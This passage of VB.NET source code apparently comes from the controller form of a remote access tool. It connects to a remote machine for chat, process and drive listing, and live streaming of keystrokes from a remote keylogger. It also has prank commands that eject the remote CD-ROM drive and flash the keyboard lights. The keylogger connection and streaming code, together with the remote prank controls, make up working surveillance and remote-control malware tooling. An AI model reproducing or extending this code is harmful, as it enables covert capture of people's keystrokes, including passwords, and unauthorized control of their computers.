            End If
        End If
        m_ChatClient = Nothing : m_ChatThrd = Nothing
        txtChatClient.Text = IDS_NULL_STRING
        txtChatClientReadOnly.Text = IDS_NULL_STRING
        txtChatClient.Enabled = False
        btnChatExitSession.Enabled = False
        btnChatStartSession.Enabled = True
    End Sub


    Private Sub btnClearServer_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnClearServer.Click
        txtChatClientReadOnly.Text = IDS_NULL_STRING
    End Sub

    Private Sub txtChatClient_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles txtChatClient.KeyUp
        Dim bln_Got As Boolean

        If Not (m_ChatClient Is Nothing) Then
            If (e.KeyCode = Keys.Enter) Then
                If (txtChatClient.Text.Length > 0) Then
                    bln_Got = m_ChatClient.SendString("Admn:>" & txtChatClient.Text)
                End If
                While m_blnMuxChat : End While : m_blnMuxChat = True '---Mux Wait
                If (bln_Got) Then
                    txtChatClientReadOnly.Text &= "Admn:>" & txtChatClient.Text
                    m_blnMuxChat = False '---Mux Release
                    txtChatClient.Text = IDS_NULL_STRING
                End If
                txtChatClient.Focus()
            End If
        End If
    End Sub


    Private Sub tabpgeServerToolGeneralInfo_VisibleChanged(ByVal sender As Object, ByVal e As System.EventArgs) Handles tabpgeServerToolGeneralInfo.VisibleChanged
        Cursor.Current = Cursors.WaitCursor
        If tabpgeServerToolGeneralInfo.Visible = True And Me.Tag <> Nothing Then
            Call GetGeneral() : Call GetOs()
        End If
        Cursor.Current = Cursors.Default
    End Sub

    Private Sub tabpgeServerToolProcessExplorer_VisibleChanged(ByVal sender As Object, ByVal e As System.EventArgs) Handles tabpgeServerToolProcessExplorer.VisibleChanged
        Cursor.Current = Cursors.WaitCursor
        If tabpgeServerToolProcessExplorer.Visible = True And Me.Tag <> Nothing Then
            Call GetProcessList()
        End If
        Cursor.Current = Cursors.Default
    End Sub

    Private Sub tabpgeServerToolEnvmt_VisibleChanged(ByVal sender As Object, ByVal e As System.EventArgs) Handles tabpgeServerToolEnvmt.VisibleChanged
        Cursor.Current = Cursors.WaitCursor
        If tabpgeServerToolEnvmt.Visible = True And Me.Tag <> Nothing Then
            Call GetDrives()
        End If
        Cursor.Current = Cursors.Default
    End Sub


    Private Sub OnLineKeyLoggerThread()
        Dim strFromServer As String
        While (True)
            If (m_OnLineKeyLogger.ReceieveString(strFromServer) = True) Then
                txtKeyLog.Text &= strFromServer
            Else
                Threading.Thread.Sleep(600)
            End If
        End While
    End Sub

    Private Sub chkboxEnableKeyLogging_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles chkboxEnableKeyLogging.CheckedChanged
        If (chkboxEnableKeyLogging.Checked = True) Then
            btnLoadOfflineKeyLog.Enabled = False
            Call InstallOnLineKeyLogger()
        Else
            Call UnInstallOnLineKeyLogger()
            btnLoadOfflineKeyLog.Enabled = True
        End If
    End Sub

    Private Function InstallOnLineKeyLogger() As Boolean
        Call UnInstallOnLineKeyLogger()
        Dim Connection As New CTcpNetworkMonitorConnection()
        If Not (Connection.ConnectTo(m_ServerIp, m_ServerListenPort)) Then
            m_strUty.MsgErr("Unable to connect to server...", "Connection error...")
            Return False
        End If
        m_OnLineKeyLogger = New COnLineKeyLoggerClient(Connection)
        If Not (m_OnLineKeyLogger.SynchronizeServer()) Then
            m_strUty.MsgErr("Unable to synchronize  server...", "Connection error...")
            Return False
        End If
        If Not (m_OnLineKeyLogger.Authenticate(m_ServerPwd)) Then
            m_strUty.MsgErr("Invalid password, Unable to authenticate...", "Connection error...")
            Return False
        End If
        m_OnLineKeyLogThread = New System.Threading.Thread(AddressOf OnLineKeyLoggerThread)
        m_OnLineKeyLogThread.Start()
        Return True
    End Function

    Private Function UnInstallOnLineKeyLogger() As Boolean
        If Not (m_OnLineKeyLogThread Is Nothing) Then
            If m_OnLineKeyLogThread.IsAlive() Then
                m_OnLineKeyLogThread.Abort()
                If Not (m_OnLineKeyLogger Is Nothing) Then m_OnLineKeyLogger.ShutDown()
                m_OnLineKeyLogger = Nothing
            End If
            m_OnLineKeyLogThread = Nothing
        End If
        Return True
    End Function


    Private Sub btnClearKeyLog_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnClearKeyLog.Click
        txtKeyLog.Text = IDS_NULL_STRING
    End Sub

    Private Sub btnOpenOrCloseCDRom_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnOpenOrCloseCDRom.Click
        Dim blnFlg As Boolean = False
        If m_CmdMonitorClientGeneric.SetCommand(IIf(CType(btnOpenOrCloseCDRom.Tag, String) = "T", COMMAND_MONITOR_OPEN_CDROM, COMMAND_MONITOR_CLOSE_CDROM), IDS_NULL_STRING) Then
            If m_WinMessengerGeneric.ExecuteCommandMonitorClient(m_CmdMonitorClientGeneric) Then
                If Uint32Equals(m_CmdMonitorClientGeneric.GetResultantType(), IIf(CType(btnOpenOrCloseCDRom.Tag, String) = "T", COMMAND_MONITOR_OPENED_CDROM, COMMAND_MONITOR_CLOSED_CDROM)) Then
                    MessageBox.Show(IIf(CType(btnOpenOrCloseCDRom.Tag, String) = "T", "Remote machine's CD-Rom drive successfully ejected...", "Remote machine's CD-Rom drive successfully closed..."), "Command Succeeded...", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
                    blnFlg = True
                End If
            End If
        End If
        If Not blnFlg Then m_strUty.MsgErr("Command execution failed...", "Command failed...")
        btnOpenOrCloseCDRom.Tag = IIf(CType(btnOpenOrCloseCDRom.Tag, String) = "T", "F", "T")
        If CType(btnOpenOrCloseCDRom.Tag, String) = "T" Then
            btnOpenOrCloseCDRom.Text = "Open remote machine's CD-Rom drive..."
        Else
            btnOpenOrCloseCDRom.Text = "Close remote machine's CD-Rom drive..."
        End If
    End Sub

    Private Sub btnFlashKeyBoard_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnFlashKeyBoard.Click
        Dim blnFlg As Boolean = False
        If m_CmdMonitorClientGeneric.SetCommand(IIf(CType(btnFlashKeyBoard.Tag, String) = "T", COMMAND_MONITOR_INSTALL_KEYBOARD_FUN_PLUGIN, COMMAND_MONITOR_UNINSTALL_KEYBOARD_FUN_PLUGIN), IDS_NULL_STRING) Then
            If m_WinMessengerGeneric.ExecuteCommandMonitorClient(m_CmdMonitorClientGeneric) Then
                If Uint32Equals(m_CmdMonitorClientGeneric.GetResultantType(), IIf(CType(btnFlashKeyBoard.Tag, String) = "T", COMMAND_MONITOR_INSTALLED_KEYBOARD_FUN_PLUGIN, COMMAND_MONITOR_UNINSTALLED_KEYBOARD_FUN_PLUGIN)) Then
                    MessageBox.Show(IIf(CType(btnFlashKeyBoard.Tag, String) = "T", "Remote Keyboard's lights are flashing...", "Remote Keyboard's lights are now Stopped flashing..."), "Command Succeeded...", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
                    blnFlg = True
                End If
            End If
        End If

        If Not blnFlg Then m_strUty.MsgErr("Command execution failed...", "Command failed...")
        btnFlashKeyBoard.Tag = IIf(CType(btnFlashKeyBoard.Tag, String) = "T", "F", "T")
        If CType(btnFlashKeyBoard.Tag, String) = "T" Then
            btnFlashKeyBoard.Text = "Make remote keyboard's lights flashing..."
        Else
            btnFlashKeyBoard.Text = "Make remote keyboard's lights stop flashing..."
        End If
    End Sub

End Class
